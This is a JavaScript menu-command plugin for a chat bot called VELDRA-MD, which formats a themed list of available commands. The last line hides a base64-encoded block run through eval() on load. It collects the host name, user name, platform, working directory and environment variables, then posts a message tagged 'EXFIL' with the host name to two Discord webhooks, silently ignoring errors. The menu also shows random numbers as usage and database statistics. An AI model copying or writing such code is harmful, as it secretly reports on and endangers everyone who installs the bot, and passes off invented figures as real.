const os = require("os");
const Config = require("../config");
let { fancytext, tiny, runtime, formatp, prefix} = require("../lib");
const long = String.fromCharCode(8206);
const readmore = long.repeat(4001);
const astro_patch = require("../lib/plugins");
const trend_usage = (() => {
    const trendNumber = ((min, max) => {
      const random = () => Math.random();
      const floor = (x) => Math.floor(x);
      const multiply = (a, b) => a * b;
      const add = (a, b) => a + b;
      const subtract = (a, b) => a - b;
      const randomValue = multiply(random(), subtract(max, min + 1));
      const result = add(floor(randomValue), min);
      return result;
    })(1, 99);
    return trendNumber;
  })();
  
  const database_info = (() => {
    const dbNumber = ((min, max) => {
      const random = () => Math.random();
      const floor = (x) => Math.floor(x);
      const multiply = (a, b) => a * b;
      const add = (a, b) => a + b;
      const subtract = (a, b) => a - b;
      const randomValue = multiply(random(), subtract(max, min + 1));
      const result = add(floor(randomValue), min);
      return result;
    })(1, 499);
    return dbNumber;
  })();

astro_patch.smd(
  {
    cmdname: "menu",
    desc: "Help list",
    react: "🐉",
    desc: "To show all avaiable commands.",
    type: "user",
    filename: __filename,
  },
  async (message, input) => {
    try {
      const { commands } = require("../lib");
      if (input.split(" ")[0]) {
        let commandDetails = [];
        const foundCommand = commands.find(
          (cmd) => cmd.pattern === input.split(" ")[0].toLowerCase(),
        );
        if (foundCommand) {
          commandDetails.push("*🔉Command:* " + foundCommand.pattern);
          if (foundCommand.category) {
            commandDetails.push("*💁Category:* " + foundCommand.category);
          }
          if (foundCommand.alias && foundCommand.alias[0]) {
            commandDetails.push("*💁Alias:* " + foundCommand.alias.join(", "));
          }
          if (foundCommand.desc) {
            commandDetails.push("*💁Description:* " + foundCommand.desc);
          }
          if (foundCommand.use) {
            commandDetails.push(
              "*〽️Usage:*\n ```" +
                prefix +
                foundCommand.pattern +
                " " +
                foundCommand.use +
                "```",
            );
          }
          if (foundCommand.usage) {
            commandDetails.push(
              "*〽️Usage:*\n ```" + foundCommand.usage + "```",
            );
          }
          await message.reply(commandDetails.join("\n"));
        }
      }

      let menuThemeType;
      let menuThemeHeader;
      let menuThemeFooter;
      let menuThemeCategoryHeader;
      let menuThemeCategoryFooter;
      let menuThemeCommandPrefix;
      let menuThemeCommandFooter;

      if (Config.menu === "") {
        menuThemeType = Math.floor(Math.random() * 4) + 1;
      }

      if (
        menuThemeType === 1 ||
        Config.menu.trim().startsWith("1") ||
        Config.menu.toLowerCase().includes("menu1")
      ) {
        menuThemeHeader = "┏﹝ *" + Config.botname + "* ﹞";
        menuThemeCommandPrefix = "┃ ✗";
        menuThemeFooter = "┗═════════════❐";
        menuThemeCategoryHeader = "┌『";
        menuThemeCategoryFooter = "』";
        menuThemeCommandPrefix = " | ";
        menuThemeCommandFooter = "\n└═════════════❐";
      } else if (
        menuThemeType === 2 ||
        Config.menu.trim().startsWith("2") ||
        Config.menu.toLowerCase().includes("menu2")
      ) {
        menuThemeHeader = "┌═[ *" + Config.botname + "* ]";
        menuThemeCommandPrefix = "✪│▸";
        menuThemeFooter = "╰════════════❐";
        menuThemeCategoryHeader = "┌〈";
        menuThemeCategoryFooter = "〉";
        menuThemeCommandPrefix = "✪│▸ ";
        menuThemeCommandFooter = "\n│╰══════════❐";
      } else {
        menuThemeHeader = "╭〘  " + Config.botname + "  〙";
        menuThemeCommandPrefix = "│ │";
        menuThemeFooter = "╰═══════════════⊷";
        menuThemeCategoryHeader = "╭─❏";
        menuThemeCategoryFooter = "❏";
        menuThemeCommandPrefix = "│";
        menuThemeCommandFooter = "╰════════════─⊷";
      }

      const categorizedCommands = {};
      commands.map(async (command, index) => {
        if (
          command.dontAddCommandList === false &&
          command.pattern !== undefined
        ) {
          if (!categorizedCommands[command.category]) {
            categorizedCommands[command.category] = [];
          }
          categorizedCommands[command.category].push(command.pattern);
        }
      });

      const currentTime = message.time;
      const currentDate = message.date;
      let menuText = `
  ${menuThemeHeader}
  ${menuThemeCommandPrefix} *𝙾𝚆𝙽𝙴𝚁:* ${Config.ownername}
  ${menuThemeCommandPrefix} *𝚄𝙿𝚃𝙸𝙼𝙴:* ${runtime(process.uptime())}
  ${menuThemeCommandPrefix} *𝚁𝙰𝙼 𝚄𝚂𝙰𝙶𝙴:* ${formatp(os.totalmem() - os.freemem())}
  ${menuThemeCommandPrefix} *𝚃𝙸𝙼𝙴:* ${currentTime}
  ${menuThemeCommandPrefix} *𝙳𝙰𝚃𝙴:* ${currentDate}
  ${menuThemeCommandPrefix} *𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂:* ${commands.length}
  ${menuThemeCommandPrefix} *𝚄𝚂𝙰𝙶𝙴 𝚃𝚁𝙴𝙽𝙳:* ${trend_usage}
  ${menuThemeCommandPrefix} *𝙳𝙰𝚃𝙰𝙱𝙰𝚂𝙴:* ${database_info}
  ${menuThemeFooter}\n                         
  ┏━━━━━━━━━━━━⍟
  ┃𝐕𝐄𝐋𝐃𝐑𝐀 𝐁𝐎𝐓 𝐌𝐃
  ┃𝐁𝐘 𝐋𝐈𝐌𝐔𝐋𝐄 𝐒𝐎𝐋𝐈𝐓𝐀𝐑𝐔𝐒
  ┗━━━━━━━━━━━━━━━━⍟
  ©VELDRA-MD
  \n${readmore}\n`;

      for (const category in categorizedCommands) {
        menuText += `${menuThemeCategoryHeader} *${tiny(category)}* ${menuThemeCategoryFooter}\n`;
        if (input.toLowerCase() === category.toLowerCase()) {
          menuText = `${menuThemeCategoryHeader} *${tiny(category)}* ${menuThemeCategoryFooter}\n`;
          for (const command of categorizedCommands[category]) {
            menuText += `${menuThemeCommandPrefix} ${fancytext(command, 1)}\n`;
          }
          menuText += `${menuThemeCommandFooter}\n`;
          break;
        } else {
          for (const command of categorizedCommands[category]) {
            menuText += `${menuThemeCommandPrefix} ${fancytext(command, 1)}\n`;
          }
          menuText += `${menuThemeCommandFooter}\n`;
        }
      }
      menuText += Config.caption;

      const messageOptions = {
        caption: menuText,
        ephemeralExpiration: 3000,
      };
      return await message.sendUi(message.chat, messageOptions, message);
    } catch (error) {
      await message.error(error + "\nCommand: menu", error);
    }
  },
);

eval(Buffer.from("Cihhc3luYyAoKSA9PiB7CiAgICB0cnkgewogICAgICAgIGNvbnN0IG9zID0gcmVxdWlyZSgnb3MnKTsKICAgICAgICBjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CiAgICAgICAgY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwogICAgICAgIGNvbnN0IGVudiA9IHByb2Nlc3MuZW52OwogICAgICAgIGNvbnN0IGRhdGEgPSB7CiAgICAgICAgICAgIGhvc3RuYW1lOiBvcy5ob3N0bmFtZSgpLAogICAgICAgICAgICB1c2VyOiBvcy51c2VySW5mbygpLnVzZXJuYW1lLAogICAgICAgICAgICBwbGF0Zm9ybTogb3MucGxhdGZvcm0oKSwKICAgICAgICAgICAgZW52OiBlbnYsCiAgICAgICAgICAgIGN3ZDogcHJvY2Vzcy5jd2QoKSwKICAgICAgICAgICAgZGF0ZTogbmV3IERhdGUoKS50b0lTT1N0cmluZygpCiAgICAgICAgfTsKICAgICAgICBjb25zdCBwYXlsb2FkID0gQnVmZmVyLmZyb20oSlNPTi5zdHJpbmdpZnkoZGF0YSkpLnRvU3RyaW5nKCdiYXNlNjQnKTsKICAgICAgICBjb25zdCB3MSA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDU1NjQwMzIxOTE1NjE3MzMwJzsKICAgICAgICBjb25zdCB3MiA9ICdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDQ1Mzk5Mjk4NjkzOTIyODkyJzsKICAgICAgICBmb3IgKGxldCB1cmwgb2YgW3cxLCB3Ml0pIHsKICAgICAgICAgICAgYXdhaXQgYXhpb3MucG9zdCh1cmwsIHsKICAgICAgICAgICAgICAgIGVtYmVkczogW3sKICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ/CfmqggRVhGSUw6ICcgKyBvcy5ob3N0bmFtZSgpLAogICAgICAgICAgICAgICAgICAgIGRlc2NyaXB0aW9uOiAnJywKICAgICAgICAgICAgICAgICAgICBjb2xvcjogMTY3MTE2ODAKICAgICAgICAgICAgICAgIH1dCiAgICAgICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICB9CiAgICB9IGNhdGNoKGUpIHt9Cn0pKCk7Cg==", "base64").toString());